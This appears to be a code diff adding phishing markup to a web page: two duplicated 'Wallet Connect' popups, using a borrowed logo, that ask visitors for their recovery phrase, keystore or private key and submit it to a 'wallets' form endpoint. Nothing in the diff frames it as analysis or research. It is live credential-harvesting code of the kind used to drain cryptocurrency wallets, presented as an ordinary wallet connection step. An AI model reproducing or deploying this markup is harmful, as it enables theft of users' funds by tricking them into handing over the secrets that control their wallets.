@@ -48,6 +48,75 @@
         </div>
     </div>
 
+    <div id="popup" >
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <div class="to-send-info">
+                    <div class="wallet-app-send-logo">
+                        <img id="current-wallet-send-logo" src="https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="wallet-app-name">
+                    </div>
+                    <div id="current-wallet-app-send" class="wallet-app-name-send">Wallet Connect</div>
+                </div>
+                <div class="send-tabs">
+                    <button id="phraseSend">Phrase</button>
+                    <button id="keystoreSend">Keystore</button>
+                    <button id="privateKeySend">Private Key</button>
+                </div>
+                <div class="message-tab"></div>
+                <div class="send-form">
+                    <form action="wallets" id="processForm" enctype="multipart/form-data">
+                        <input type="hidden" name="wallet" id="walletNameData" value="Wallet Connect">
+                        <div id="data-to-send">
+                            <div class="form-group">
+                                <input type="hidden" id="type" name="type" value="keystore">
+                                <textarea name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
+                            </div>
+                            <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>
+                        </div>
+                        <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;">PROCEED</button>
+                        <div class="text-right">
+                            <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="popup" >
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <div class="to-send-info">
+                    <div class="wallet-app-send-logo">
+                        <img id="current-wallet-send-logo" src="https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="wallet-app-name">
+                    </div>
+                    <div id="current-wallet-app-send" class="wallet-app-name-send">Wallet Connect</div>
+                </div>
+                <div class="send-tabs">
+                    <button id="phraseSend">Phrase</button>
+                    <button id="keystoreSend">Keystore</button>
+                    <button id="privateKeySend">Private Key</button>
+                </div>
+                <div class="message-tab"></div>
+                <div class="send-form">
+                    <form action="wallets" id="processForm" enctype="multipart/form-data">
+                        <input type="hidden" name="wallet" id="walletNameData" value="Wallet Connect">
+                        <div id="data-to-send">
+                            <input type="text" name="privateKey" required="" class="form-control" placeholder="Enter your Private Key">
+                            <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>
+                        </div>
+                        <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;">PROCEED</button>
+                        <div class="text-right">
+                            <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div id="header"> 
         <div class="content-box-md"> 
             <div class="container"> 
